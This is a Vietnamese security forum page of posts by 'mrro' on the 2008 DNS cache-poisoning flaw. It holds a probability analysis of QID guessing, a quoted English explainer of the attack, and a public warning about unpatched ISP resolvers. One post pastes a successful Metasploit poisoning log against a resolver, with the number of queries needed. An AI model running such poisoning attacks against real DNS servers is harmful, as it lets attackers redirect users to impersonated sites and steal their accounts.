<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by mrro, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by mrro - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/158.html" name="top" class="maintitle" id="top">Messages posted by: mrro</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/158.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/158.html">Profile for mrro</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/158.html">Messages posted by mrro</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">6</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23739.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23739/143280.html#143280,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">lamer wrote:</cite><br>
<blockquote><br/> Nếu không phải dùng birthday paradox thì trong cái exploit em đang dùng đó nó sẽ không gửi hàng loạt trả lời giả với QID trong một miền giá trị mà nó sẽ chỉ gửi một trả lời giả với một QID nhất định . Mục tiêu cuối cùng cũng chỉ là tăng khả năng trúng QID.<br/> &nbsp;
</blockquote><br/><br/> Đúng là mục tiêu cuối cùng là tăng khả năng đoán trúng QID, nhưng cái này không phải là birthday paradox.<br/><br/> Birthday paradox chỉ xảy ra khi một câu query của thằng attacker khiến thằng resolver gửi ra ngoài q &gt; 1 câu query giống nhau, chỉ khác QID. Lúc này nhóm các câu trả lời giả của exploit sẽ có cơ hội *collision* với nhóm q câu trả lời, làm cho xác suất đoán trúng tăng đột biến.<br/><br/> Trong trường hợp này, q=1, nên không thể xảy ra birthday paradox ở đây. Xem thêm<span class="link"> http://www.kb.cert.org/vuls/id/457875.</span><br/><br/> Việc exploit gửi ra một loạt trả lời giả với QID trong một miền giá trị chỉ nhằm mục đích tăng xác suất đoán trúng QID đối với câu query duy nhất mà resolver đã gửi ra ngoài trước đó. Xác suất đoán trúng lúc này sẽ là x/2^16, trong đó x là số lượng trả lời giả mà exploit gửi đối với mỗi câu query. Anh lưu ý là danh sách các QID giả này nó không thay đổi trong suốt thời gian exploit được chạy.<br/><br/> Mỗi lần gửi một query, xác suất đoán sai là 1-x/2^16. Các lần gửi query đều độc lập với nhau, cho nên xác suất đoán sai cho đến lần gửi query thứ n sẽ là (1-x/2^16)^n. Suy ra xác suất đoán đúng sẽ là 1 - (1-x/2^16)^n. Đó là công thức hồi nãy em có nói.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23739.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23739/143244.html#143244,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tui nghĩ bồ mfeng với anh lamer có nhầm lẫn. Cái này không phải là tấn công lợi dụng birthday paradox. Lý do là các query mà target gửi ra ngoài đều khác nhau (do câu hỏi khác nhau). Nếu lợi dụng được birthday paradox thì tấn công này có lẽ đã nhanh hơn rất nhiều rồi.<br/><br/> Công thức mà tui tính toán thế này:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>P = 1 - &#40;1 - X/2^16&#41;^N, trong đó:
- X: số fake response ứng với một cặp &#40;một query + một authorative DNS server&#41;
- N: số query</pre>
</div><br/><br/> Một vài con số tính toán:<br/><br/> * Với X = 10, N = 5000 là đã có thể có xác suất hơn 53% đoán đúng.<br/><br/> * Với X = 20, N = 5000 là đã có gần 96% đoán đúng<br/><br/> Tui cũng đã kiểm tra trong thực tế luôn, thấy với X = 10, và 5000 &lt; N &lt; 8000 là có thể thành công rồi với xác suất khá cao:<br/><br/> <blockquote><br/> msf auxiliary(bailiwicked_host) &gt; run<br/> [*] Targeting nameserver 10.10.11.63 for injection of www.vnexpress.net. as 3.3.3.3<br/> [*] Querying recon nameserver for vnexpress.net.'s nameservers...<br/> [*] Got an NS record: vnexpress.net. 75809 IN NS dns010.d.register.com.<br/> [*] Querying recon nameserver for address of dns010.d.register.com....<br/> [*] Got an A record: dns010.d.register.com. 163883 IN A 216.21.236.10<br/> [*] Checking Authoritativeness: Querying 216.21.236.10 for vnexpress.net....<br/> [*] dns010.d.register.com. is authoritative for vnexpress.net., adding to list of nameservers to spoof as<br/> [*] Got an NS record: vnexpress.net. 75809 IN NS dns026.c.register.com.<br/> [*] Querying recon nameserver for address of dns026.c.register.com....<br/> [*] Got an A record: dns026.c.register.com. 163880 IN A 216.21.235.26<br/> [*] Checking Authoritativeness: Querying 216.21.235.26 for vnexpress.net....<br/> [*] dns026.c.register.com. is authoritative for vnexpress.net., adding to list of nameservers to spoof as<br/> [*] Got an NS record: vnexpress.net. 75809 IN NS dns131.a.register.com.<br/> [*] Querying recon nameserver for address of dns131.a.register.com....<br/> [*] Got an A record: dns131.a.register.com. 163879 IN A 216.21.231.131<br/> [*] Checking Authoritativeness: Querying 216.21.231.131 for vnexpress.net....<br/> [*] dns131.a.register.com. is authoritative for vnexpress.net., adding to list of nameservers to spoof as<br/> [*] Got an NS record: vnexpress.net. 75809 IN NS dns238.b.register.com.<br/> [*] Querying recon nameserver for address of dns238.b.register.com....<br/> [*] Got an A record: dns238.b.register.com. 163878 IN A 216.21.232.238<br/> [*] Checking Authoritativeness: Querying 216.21.232.238 for vnexpress.net....<br/> [*] dns238.b.register.com. is authoritative for vnexpress.net., adding to list of nameservers to spoof as<br/> [*] Attempting to inject a poison record for www.vnexpress.net. into 10.10.11.63:53...<br/> [*] Sent 1000 queries and 40000 spoofed responses...<br/> [*] Sent 2000 queries and 80000 spoofed responses...<br/> [*] Sent 3000 queries and 120000 spoofed responses...<br/> [*] Sent 4000 queries and 160000 spoofed responses...<br/> [*] Sent 5000 queries and 200000 spoofed responses...<br/> [*] Sent 6000 queries and 240000 spoofed responses...<br/> [*] Sent 7000 queries and 280000 spoofed responses...<br/> [*] Poisoning successful after 7250 attempts: www.vnexpress.net == 3.3.3.3<br/> [*] Auxiliary module execution completed<br/><br/> &nbsp;
</blockquote><br/><br/> --m<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23739.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23739/143110.html#143110,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Mới có public exploit cho cái này: http://www.caughq.org/exploits/CAU-EX-2008-0002.txt.<br/><br/> Cái exploit này không được hiệu quả cho lắm (về mặt tốc độ), tuy vậy nó khá là thuận tiện bởi nó làm hết tất cả các công đoạn một cách tự động.<br/><br/> Sử dụng cái exploit này phải chú ý nhé, rất có thể đám Metasploit dùng nó để collect thông tin từ các server bị lỗi đó :-p. Ngoài ra nó cũng có một lỗi nhỏ, nên không thể dùng nó để khai thác các domain dạng www.xxx.com.vn. Tui có report cái lỗi này rồi, không biết đám Metasploit có sửa hay không.<br/><br/> Tui có viết một cái exploit bằng python, nhanh hơn nhưng bất tiện hơn, nay mai sẽ release.<br/><br/> To boom_jt, catdog: cái tool check đó nó không thể detect được các trường hợp DNS firewall đứng ngoài sau NAT device.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23739.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23739/143032.html#143032,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Riêng ở HVA, thì mình thử bàn thêm làm sao khai thác lỗ hổng này? Đây là một bài post có nhiều thông tin từ một trong những người biết được chính xác về lỗ hổng này:<br/><br/> <blockquote><br/> 0.<br/><br/> The cat is out of the bag. Yes, Halvar Flake figured out the flaw Dan Kaminsky will announce at Black Hat.<br/> 1.<br/><br/> Pretend for the moment that you know only the basic function of DNS — that it translates WWW.VICTIM.COM into 1.2.3.4. The code that does this is called a resolver. Each time the resolver contacts the DNS to translate names to addresses, it creates a packet called a query. The exchange of packets is called a transaction. Since the number of packets flying about on the internet requires scientific notation to express, you can imagine there has to be some way of not mixing them up.<br/><br/> Bob goes to to a deli, to get a sandwich. Bob walks up to the counter, takes a pointy ticket from a round red dispenser. The ticket has a number on it. This will be Bob’s unique identifier for his sandwich acquisition transaction. Note that the number will probably be used twice — once when he is called to the counter to place his order and again when he’s called back to get his sandwich. If you’re wondering, Bob likes ham on rye with no onions.<br/><br/> If you’ve got this, you have the concept of transaction IDs, which are numbers assigned to keep different transactions in order. Conveniently, the first sixteen bits of a DNS packet is just such a unique identifier. It’s called a query id (QID). And with the efficiency of the deli, the QID is used for multiple transactions.<br/> 2.<br/><br/> Until very recently, there were two basic classes of DNS vulnerabilities. One of them involves mucking about with the QID in DNS packets and the other requires you to know the Deep Magic.<br/><br/> First, QIDs.<br/><br/> Bob’s a resolver and Alice is a content DNS server. Bob asks Alice for the address of WWW.VICTIM.COM. The answer is 1.2.3.4. Mallory would like the answer to be 6.6.6.0.<br/><br/> It is a (now not) secret shame of mine that for a great deal of my career, creating and sending packets was, to me, Deep Magic. Then it became part of my job, and I learned that it is surprisingly trivial. So put aside the idea that forging IP packets is the hard part of poisoning DNS. If I’m Mallory and I’m attacking Bob, how can he distinguish my packets from Alice’s? Because I can’t see the QID in his request, and the QID in my response won’t match. The QID is the only thing protecting the DNS from Mallory (me).<br/><br/> QID attacks began in the olden days, when BIND simply incremented the QID with every query response. If you can remember 1995, here’s a workable DNS attack. Think fast: 9372 + 1. Did you get 9372, or even miss and get 9373? You win, Alice loses. Mallory sends a constant stream of DNS responses for WWW.VICTIM.COM. All are quietly discarded —- until Mallory gets Bob to query for WWW.VICTIM.COM. If Mallory’s response gets to your computer before the legitimate response arrives from your ISP’s name server, you will be wwwected where Mallory tells you you’re going.<br/><br/> Obvious fix: you want the QID be randomly generated. Now Alice and Mallory are in a race. Alice sees Bob’s request and knows the QID. Mallory has to guess it. The first one to land a packet with the correct QID wins. Randomized QIDs give Alice a big advantage in this race.<br/><br/> But there’s a bunch more problems here:<br/><br/> *<br/><br/> If you convince Bob to ask Alice the same question 1000 times all at once, and Bob uses a different QID for each packet, you made the race 1000 times easier for Mallory to win.<br/> *<br/><br/> If Bob uses a crappy random number generator, Mallory can get Bob to ask for names she controls, like WWW.EVIL.COM, and watch how the QIDs bounce around; eventually, she’ll break the RNG and be able to predict its outputs.<br/> *<br/><br/> 16 bits just isn’t big enough to provide real security at the traffic rates we deal with in 2008.<br/><br/> Your computer’s resolver is probably a stub. Which means it won’t really save the response. You don’t want it to. The stub asks a real DNS server, probably run by your ISP. That server doesn’t know everything. It can’t, and shouldn’t, because the whole idea of DNS is to compensate for the organic and shifting nature of internet naming and addressing. Frequently, that server has to go ask another, and so on. The cool kids call this “recursion”.<br/><br/> Responses carry another value, too, called a time to live (TTL). This number tells your name server how long to cache the answer. Why? Because they deal with zillions of queries. Whoever wins the race between Alice and Mallory, their answer gets cached. All subsequent responses will be dropped. All future requests for that same data, within the TTL, come from that answer. This is good for whoever wins the race. If Alice wins, it means Mallory can’t poison the cache for that name. If Mallory wins, the next 10,000 or so people that ask that cache where WWW.VICTIM.COM is go to 6.6.6.0.<br/> 3.<br/><br/> Then there’s that other set of DNS vulnerabilities. These require you to pay attention in class. They haven’t really been talked about since 1997. And they’re hard to find, because you have to understand how DNS works. In other words, you have to be completely crazy. Lazlo Hollyfeld crazy. I’m speaking of course of RRset poisoning.<br/><br/> DNS has a complicated architecture. Not only that, but not all name servers run the same code. So not all of them implement DNS in exactly the same way. And not only that, but not all name servers are configured properly.<br/><br/> I just described a QID attack that poisons the name server’s cache. This attack requires speed, agility and luck, because if the “real” answer happens to arrive before your spoofed one, you’re locked out. Fortunately for those of you that have a time machine, some versions of DNS provide you with another way to poison the name server’s cache anyway. To explain it, I will have to explain more about the format of a DNS packet.<br/><br/> DNS packets are variable in length and consist of a header, some flags and resource records (RRs). RRs are where the goods ride around. There are up to three sets of RRs in a DNS packet, along with the original query. These are:<br/><br/> *<br/><br/> Answer RR’s, which contain the answer to whatever question you asked (such as the A record that says WWW.VICTIM.COM is 1.2.3.4)<br/> *<br/><br/> Authority RR’s, which tell resolvers which name servers to refer to to get the complete answer for a question<br/> *<br/><br/> Additional RR’s, sometimes called “glue”, which contain any additional information needed to make the response effective.<br/><br/> A word about the Additional RR’s. Think about an NS record, like the one that COM’s name server uses to tell us that, to find out where WWW.VICTIM.COM is, you have to ask NS1.VICTIM.COM. That’s good to know, but it’s not going to help you unless you know where to find NS1.VICTIM.COM. Names are not addresses. This is a chicken and egg problem. The answer is, you provide both the NS record pointing VICTIM.COM to NS1.VICTIM.COM, and the A record pointing NS1.VICTIM.COM to 1.2.3.1.<br/><br/> Now, let’s party like it’s 1995.<br/><br/> Download the source code for a DNS implementation and hack it up such that every time it sends out a response, it also sends out a little bit of evil — an extra Additional RR with bad information. Then let’s set up an evil server with it, and register it as EVIL.COM. Now get a bunch of web pages up with IMG tags pointing to names hosted at that server.<br/><br/> Bob innocently loads up a page with the malicious tags which coerces his browser resolve that name. Bob asks Alice to resolve that name. Here comes recursion: eventually the query arrives at our evil server. Which sends back a response with an unexpected (evil) Additional RR.<br/><br/> If Alice’s cache honors the unexpected record, it’s 1995 —- buy CSCO! —- and you just poisoned their cache. Worse, it will replace the “real” data already in the cache with the fake data. You asked where WWW.EVIL.COM was (or rather, the image tags did). But Alice also “found out” where WWW.VICTIM.COM was: 6.6.6.0. Every resolver that points to that name server will now gladly forward you to the website of the beast.<br/> 4.<br/><br/> It’s not 1995. It’s 2008. There are fixes for the attacks I have described.<br/> Fix 1:<br/><br/> The QID race is fixed with random IDs, and by using a strong random number generator and being careful with the state you keep for queries. 16 bit query IDs are still too short, which fills us with dread. There are hacks to get around this. For instance, DJBDNS randomizes the source port on requests as well, and thus won’t honor responses unless they come from someone who guesses the ~16 bit source port. This brings us close to 32 bits, which is much harder to guess.<br/> Fix 2:<br/><br/> The RR set poisoning attack is fixed by bailiwick checking, which is a quirky way of saying that resolvers simply remember that if they’re asking where WWW.VICTIM.COM is, they’re not interested in caching a new address for WWW.GOOGLE.COM in the same transaction.<br/><br/> Remember how these fixes work. They’re very important.<br/><br/> And so we arrive at the present day.<br/> 5.<br/><br/> Let’s try again to convince Bob that WWW.VICTIM.COM is 6.6.6.0.<br/><br/> This time though, instead of getting Bob to look up WWW.VICTIM.COM and then beating Alice in the race, or getting Bob to look up WWW.EVIL.COM and slipping strychnine into his ham sandwich, we’re going to be clever (sneaky).<br/><br/> Get Bob to look up AAAAA.VICTIM.COM. Race Alice. Alice’s answer is NXDOMAIN, because there’s no such name as AAAAA.VICTIM.COM. Mallory has an answer. We’ll come back to it. Alice has an advantage in the race, and so she likely beats Mallory. NXDOMAIN for AAAAA.VICTIM.COM.<br/><br/> Alice’s advantage is not insurmountable. Mallory repeats with AAAAB.VICTIM.COM. Then AAAAC.VICTIM.COM. And so on. Sometime, perhaps around CXOPQ.VICTIM.COM, Mallory wins! Bob believes CXOPQ.VICTIM.COM is 6.6.6.0!<br/><br/> Poisoning CXOPQ.VICTIM.COM is not super valuable to Mallory. But Mallory has another trick up her sleeve. Because her response didn’t just say CXOPQ.VICTIM.COM was 6.6.6.0. It also contained Additional RRs pointing WWW.VICTIM.COM to 6.6.6.0. Those records are in-bailiwick: Bob is in fact interested in VICTIM.COM for this query. Mallory has combined attack #1 with attack #2, defeating fix #1 and fix #2. Mallory can conduct this attack in less than 10 seconds on a fast Internet link.<br/> &nbsp;
</blockquote></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23739.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23739/143030.html#143030,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Gửi các bạn của tôi, mới đây một lỗ hổng bảo mật cực kỳ nghiêm trọng được phát hiện trong hệ thống DNS, xương sống của toàn bộ Internet.<br/><br/> <font color='green'><br/> Tận dụng lỗ hổng này, kẻ xấu có thể tấn công để đánh cắp tất cả thông tin trên Internet của bạn, chẳng hạn như chiếm quyền điều khiển blog của bạn, chôm mật khẩu để đọc trộm email hay giả danh bạn để chat trên Yahoo! Messenger. Tôi nhắc<br/> lại, khi khai thác thành công lỗ hổng này, kẻ xấu hoàn toàn có thể chiếm quyền điều khiển cuộc sống online của bạn.<br/> </font><br/><br/> Bài này được viết để cung cấp thêm cho các bạn những thông tin cần biết về lỗ hổng này, cũng như các phương pháp phòng chống tạm thời, cho đến khi có giải pháp triệt để từ phía các ISP ở VN.<br/><br/> ---<br/><br/> 1. Giới thiệu về DNS<br/><br/><br/> DNS viết tắt của Domain Name System, là hệ thống quản lý việc ánh xạ giữa địa chỉ của máy tính trên Internet với tên của chúng. Trên Internet, mỗi máy tính đều được cấp một địa chỉ riêng biệt, thường được gọi là IP address, tạm dịch là địa chỉ IP (IP viết tắt của Internet Protocol, giao thức điều khiển việc trao đổi thông tin liên lạc giữa hai máy tính trên Internet).<br/><br/> Địa chỉ IP thường dài và khó nhớ, phù hợp với máy tính, không phù hợp với trí nhớ của con người (thường chỉ có khả năng nhớ được tối đa 7 số tại một thời điểm), do đó người ta mới đặt cho mỗi máy tính một cái tên dễ nhớ, chẳng hạn như www.vnexpress.net, www.yahoo.com, www.tuoitre.com.vn..., rồi sử dụng hệ thống DNS nói trên để ánh xạ những tên này vào các địa chỉ IP thực sự của chúng.<br/><br/> Khi bạn gõ www.vnexpress.net vào trình duyệt và nhấn enter, máy tính của bạn sẽ hỏi máy chủ DNS của bạn (thường là máy chủ do ISP của bạn quản lý) địa chỉ của www.vnexpress.net là bao nhiêu. Máy chủ DNS của bạn sẽ đi hỏi những máy chủ DNS khác trên Internet, để rồi cuối cùng trả lời cho máy tính của bạn rằng, www.vnexpress.net chính là tên miền của máy tính có địa chỉ IP là 210.245.0.22. Máy tính của bạn sẽ căn cứ vào địa chỉ này để liên lạc với www.vnexpress.net và lấy về nội dung mà bạn muốn xem.<br/><br/> Nếu bạn nào sống ở Mỹ hay các nước tiên tiến, thì có thể hiểu hệ thống DNS tương tự như hệ thống Postal/Zip Code, dùng để ánh xạ giữa zip code với địa chỉ nhà bạn.<br/><br/> 2. Thông tin chi tiết về lỗi<br/><br/> Lỗi tấn công ở đây xảy ra khi máy chủ DNS của bạn bị kẻ xấu cố tình cung cấp thông tin sai lệch, khiến nó nhầm tưởng địa chỉ IP của www.vnexpress.net không phải là 210.245.0.22 mà lại là một địa chỉ IP của một máy tính nằm trong sự điều khiển của hắn. Thuật ngữ chuyên ngành gọi đây là DNS cache poisoning attack.<br/><br/> Khi đó, lúc bạn gõ www.vnexpress.net, thay vì nhận được nội dung từ trang VnExpress thật, bạn sẽ nhận được nội dung giả mạo từ phía kẻ xấu. Điều nay cực kỳ nguy hại, bởi lẽ áp dụng kỹ thuật này, kẻ xấu có thể mạo danh tất cả các website trên thế giới, từ Google, Yahoo, Microsoft, Paypal hay website của ngân hàng hay công ty chứng khoán của bạn. Khi đã mạo danh các website này rồi, kẻ xấu sẽ có thể đánh cắp được tất cả tài khoản cá nhân của bạn trên những website này.<br/><br/> Nếu bạn đọc kỹ, bạn sẽ thấy kẻ xấu không trực tiếp tấn công vào máy tính của bạn, mà tấn công vào máy chủ DNS của bạn (do ISP của bạn quản lý và cung cấp lại cho bạn sử dụng).<br/><br/> Thật tế dạng tấn công này đã được thực hiện từ khá lâu và cũng đã có nhiều cách phòng chống hiệu quả, nhưng những kết quả nghiên cứu của các chuyên gia trên thế giới gần đây cho thấy, kẻ xấu có thể thực hiện việc tấn công này một cách rất dễ dàng. Một số nguồn tin cho rằng chỉ cần dưới 10s là kẻ xấu có thể tấn công một máy chủ DNS chưa được sửa lỗi.<br/><br/> 3. Tình trạng các máy chủ DNS ở VN<br/><br/> Ngay khi phát hiện ra lỗ hổng này, các chuyên gia trên thế giới đã làm việc với nhau để tìm ra các phương pháp sửa lỗi. Các hãng phần mềm đều đã có cung cấp bảng vá lỗi cho phần mềm máy chủ DNS của họ.<br/><br/> Tuy vậy, theo tìm hiểu của tôi, mặc dù các bảng vá đã được phát hành gần 2 tuần, nhưng tất cả các máy chủ DNS của các ISP VN như FPT, VDC, Vietel, SCTV...đều chưa được vá lỗi.<br/><br/> Điều này có nghĩa là tất cả những ai sử dụng dịch vụ Internet (dial-up, ADSL hay leased line) của các ISP này đều có thể bị tấn công như mô tả ở trên.<br/><br/> 